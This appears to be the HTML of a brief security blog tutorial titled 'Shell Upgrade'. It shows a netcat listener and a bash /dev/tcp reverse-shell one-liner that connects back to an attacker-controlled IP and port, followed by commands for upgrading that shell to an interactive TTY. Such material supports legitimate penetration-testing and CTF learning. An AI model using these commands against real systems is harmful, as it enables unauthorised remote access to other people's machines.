@@ -1,0 +1,164 @@
+<!doctype html>
+<html lang="en" data-accent="moss" data-f-ga4="G-ZMH6NLL7C7">
+<head>
+<meta charset="UTF-8" />
+	<meta name="viewport" content="width=device-width, initial-scale=1" /><script>try{var t=localStorage.getItem("facet-theme");if(/^(dark|light|auto)$/.test(t))document.documentElement.dataset.theme=t}catch(e){}</script>
+	<meta name="description" content="Upgrade a reverse shell" />
+	<meta name="author" content="Shengtuo Hu" />
+	<meta name="theme-color" content="#13161c" media="(prefers-color-scheme: dark)" />
+	<meta name="theme-color" content="#f5f7f9" media="(prefers-color-scheme: light)" />
+	<title>Shell Upgrade - nu1lptr</title>
+	<link rel="canonical" href="https://shengtuo.me/blog/shell-upgrade/" /><link rel="icon" href="https://shengtuo.me/favicon.ico" sizes="32x32" />
+	<link rel="icon" href="https://shengtuo.me/favicon.svg" type="image/svg+xml" />
+	<link rel="apple-touch-icon" href="https://shengtuo.me/apple-touch-icon.png" />
+	<link rel="alternate" type="application/rss+xml" title="nu1lptr - RSS Feed" href="https://shengtuo.me/rss.xml" />
+	<link rel="alternate" type="application/atom+xml" title="nu1lptr - Atom Feed" href="https://shengtuo.me/atom.xml" />
+	<link rel="stylesheet" href="https://shengtuo.me/vendor/facet/dist/facet.css" />
+	<link rel="stylesheet" href="https://shengtuo.me/vendor/facet/dist/cast/cast-layered.css" />
+	<link rel="stylesheet" href="https://shengtuo.me/vendor/facet/dist/icons.css" />
+	<link rel="stylesheet" href="https://shengtuo.me/giallo.css" />
+	<link rel="stylesheet" href="https://shengtuo.me/css/site.css" />
+
+	<meta property="og:site_name" content="nu1lptr" /><meta property="og:title" content="Shell Upgrade" />
+	<meta property="og:url" content="https://shengtuo.me/blog/shell-upgrade/" />
+	<meta property="og:description" content="Upgrade a reverse shell" />
+	<meta property="og:image" content="https://shengtuo.me/cards/blog/shell-upgrade.png" />
+	<meta property="og:locale" content="en_US" />
+	<meta property="og:type" content="article" />
+	<meta property="article:published_time" content="2025-08-15T15:24:53-07:00" />
+	<meta property="article:author" content="Shengtuo Hu" />
+	<meta property="article:tag" content="Tutorial" />
+	<meta property="article:tag" content="Reverse Shell" />
+	<meta property="article:tag" content="Shell Upgrade" /><meta name="twitter:card" content="summary_large_image" />
+	<meta name="twitter:title" content="Shell Upgrade" />
+	<meta name="twitter:description" content="Upgrade a reverse shell" />
+	<meta name="twitter:image" content="https://shengtuo.me/cards/blog/shell-upgrade.png" />
+	<meta name="twitter:site" content="@ShengtuoHu" />
+	<meta name="twitter:creator" content="@ShengtuoHu" /><script type="application/ld+json">
+{
+	"@context": "https://schema.org",
+	"@type": "BlogPosting",
+	"@id": "https://shengtuo.me/blog/shell-upgrade/#article",
+	"mainEntityOfPage": "https://shengtuo.me/blog/shell-upgrade/",
+	"url": "https://shengtuo.me/blog/shell-upgrade/",
+	"headline": "Shell Upgrade",
+	"description": "Upgrade a reverse shell",
+	"datePublished": "2025-08-15T15:24:53-07:00",
+	"dateModified": "2025-08-15T15:24:53-07:00",
+	"image": "https://shengtuo.me/cards/blog/shell-upgrade.png",
+	"keywords": ["Tutorial","Reverse Shell","Shell Upgrade"],
+	"inLanguage": "en",
+	"author": {
+		"@type": "Person",
+		"@id": "https://shengtuo.me/#person",
+		"name": "Shengtuo Hu",
+		"url": "https://shengtuo.me/"
+	},
+	"publisher": { "@id": "https://shengtuo.me/#person" }
+}
+</script>
+
+
+
+</head>
+<body>
+  <a class="f-visually-hidden" href="#main">Skip to content</a>
+  <nav class="f-nav f-nav--fixed" aria-label="Site">
+  <a class="f-nav__brand" href="https://shengtuo.me">nu1lptr</a>
+  <a href="https://shengtuo.me/blog/" aria-current="page">Blog</a>
+  <a href="https://shengtuo.me/projects/">Projects</a>
+  <a href="https://shengtuo.me/resume/">Resume</a>
+  <button class="f-btn f-btn--quiet site-search-open" type="button" aria-label="Search" title="Search (/)" hidden>
+    <svg class="site-search-icon" viewBox="0 0 24 24" aria-hidden="true"><circle cx="10.5" cy="10.5" r="6.5"/><path d="m15.5 15.5 5 5"/></svg>
+  </button>
+  <button class="f-theme-toggle" type="button" data-f-theme-toggle>Auto</button>
+</nav>
+
+  
+<main id="main" class="f-docs f-prose" data-f-code-ln="true" data-f-code-wrap="true" data-f-code-frame="false">
+  <nav class="f-toc" aria-label="On this page" data-f-scrollspy>
+  <p class="f-docs__label">On this page</p>
+  <a href="#reverse-shell">Reverse Shell</a>
+  <a href="#shell-upgrade">Shell Upgrade</a>
+  <a href="#references">References</a>
+</nav>
+
+  <article class="site-post">
+<header class="f-reading__title">
+  <p class="f-kicker"><a href="https://shengtuo.me/blog/">nu1lptr&#39;s Blog</a></p>
+  <h1>Shell Upgrade</h1>
+  <p class="f-meta site-post-meta">
+    <time datetime="2025-08-15">Aug 15, 2025</time> · 1 min read · <a href="https://shengtuo.me/tags/tutorial/">Tutorial</a> · <a href="https://shengtuo.me/tags/reverse-shell/">Reverse Shell</a> · <a href="https://shengtuo.me/tags/shell-upgrade/">Shell Upgrade</a> · <button class="f-btn f-btn--quiet site-share" type="button">Share</button><span class="site-share-status" role="status"></span>
+  </p>
+</header>
+
+    <h2 id="reverse-shell"><a class="zola-anchor" href="#reverse-shell" aria-label="Link to this section">#</a>
+Reverse Shell</h2>
+<p>A reverse shell is initiated from a remote machine and forward to our local port, so we can interact with the remote machine.</p>
+<pre class="giallo z-code" data-lang="shellscript"><code data-lang="shellscript"><span class="giallo-l"><span class="z-1 z-i"># myip: ip address of the local machine</span></span>
+<span class="giallo-l"><span class="z-1 z-i"># myport: local port</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-1 z-i"># On the local machine</span></span>
+<span class="giallo-l"><span class="z-12">nc</span><span class="z-6"> -lnvp</span><span> $myport</span></span>
+<span class="giallo-l"><span class="z-1 z-i"># Waiting for the connection</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-1 z-i"># On the remote machine</span></span>
+<span class="giallo-l"><span class="z-12">bash</span><span class="z-6"> -i</span><span class="z-3"> &gt;&amp;</span><span class="z-6"> /dev/tcp/</span><span>$myip</span><span class="z-6">/</span><span>$myport</span><span class="z-3"> 0&gt;&amp;1</span></span></code></pre><h2 id="shell-upgrade"><a class="zola-anchor" href="#shell-upgrade" aria-label="Link to this section">#</a>
+Shell Upgrade</h2>
+<p>After setting up the reverse shell, run the following commands in the reverse shell to get a TTY.</p>
+<pre class="giallo z-code" data-lang="shellscript"><code data-lang="shellscript"><span class="giallo-l"><span class="z-1 z-i"># Get a TTY</span></span>
+<span class="giallo-l"><span class="z-12">script</span><span class="z-6"> /dev/null -c bash</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-1 z-i"># Hit ^Z to send the local `nc` process to the background</span></span>
+<span class="giallo-l"><span class="z-1 z-i"># Disable &quot;echo&quot; for the local TTY and bring back `nc` process</span></span>
+<span class="giallo-l"><span class="z-12">stty</span><span class="z-6"> raw -echo</span><span class="z-3">;</span><span class="z-2"> fg</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-1 z-i"># Reset the remote shell</span></span>
+<span class="giallo-l"><span class="z-12">reset</span></span>
+<span class="giallo-l"><span class="z-1 z-i"># Note that, you won&#39;t see anything now, but remember to type in &quot;screen&quot;</span></span></code></pre><h2 id="references"><a class="zola-anchor" href="#references" aria-label="Link to this section">#</a>
+References</h2>
+<figure class="f-wide site-video">
+<iframe
+	src="https://www.youtube-nocookie.com/embed/DqE6DxqJg8Q"
+	allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share"
+	referrerpolicy="strict-origin-when-cross-origin" allowfullscreen>
+</iframe>
+</figure>
+
+    
+<nav class="site-prev-next" aria-label="More posts"><a href="https://shengtuo.me/blog/htb/dog/">← Older: Dog</a><a href="https://shengtuo.me/blog/htb/linkvortex/">Newer: LinkVortex →</a>
+</nav>
+
+  </article>
+</main>
+
+  <footer class="f-footer"><div class="f-footer__cats" aria-hidden="true"></div>
+  <ul class="f-social site-footer-social" aria-label="Elsewhere">
+    <li><a class="f-social__link" href="https://github.com/h1994st" rel="me noopener"><span class="f-icon f-icon--github" aria-hidden="true"></span><span class="f-visually-hidden">GitHub</span></a></li>
+    <li><a class="f-social__link" href="https://scholar.google.com/citations?user=VOefXMMAAAAJ" rel="me noopener"><span class="f-icon f-icon--google-scholar" aria-hidden="true"></span><span class="f-visually-hidden">Google Scholar</span></a></li>
+    <li><a class="f-social__link" href="https://www.linkedin.com/in/shengtuo/" rel="me noopener"><span class="f-icon f-icon--linkedin" aria-hidden="true"></span><span class="f-visually-hidden">LinkedIn</span></a></li>
+    <li><a class="f-social__link" href="https://x.com/ShengtuoHu" rel="me noopener"><span class="f-icon f-icon--x" aria-hidden="true"></span><span class="f-visually-hidden">X</span></a></li>
+    <li><a class="f-social__link" href="https://www.instagram.com/hst_nullderef/" rel="me noopener"><span class="f-icon f-icon--instagram" aria-hidden="true"></span><span class="f-visually-hidden">Instagram</span></a></li>
+  </ul>
+  <p class="site-footer-links"><a href="https://shengtuo.me/blog/">Blog</a> · <a href="https://shengtuo.me/notebook/">Notebook</a> · <a href="https://shengtuo.me/misc/">Misc.</a> · 
+    <a href="https://shengtuo.me/atom.xml">Feed</a>
+  </p>
+  <p>© 2026 Shengtuo Hu</p>
+</footer>
+
+  <dialog class="f-sheet" id="site-search" aria-label="Search" data-index="https://shengtuo.me/search_index.en.json">
+  <div class="f-sheet__panel">
+    <input class="f-input f-search" type="search" placeholder="Search posts and notes" aria-label="Search" autocomplete="off" />
+    <p class="f-meta site-search-status" role="status"></p>
+    <ol class="site-search-results"></ol>
+  </div>
+</dialog>
+<script type="module" src="https://shengtuo.me/js/site/search.js"></script>
+
+  
+  <script type="module" src="https://shengtuo.me/vendor/facet/dist/js/facet.js"></script>
+  <script type="module" src="https://shengtuo.me/js/site/cats.js"></script>
+  <script type="module" src="https://shengtuo.me/js/site/code-copy.js"></script><script type="module" src="https://shengtuo.me/js/site/share.js"></script>
+
+</body>
+</html>
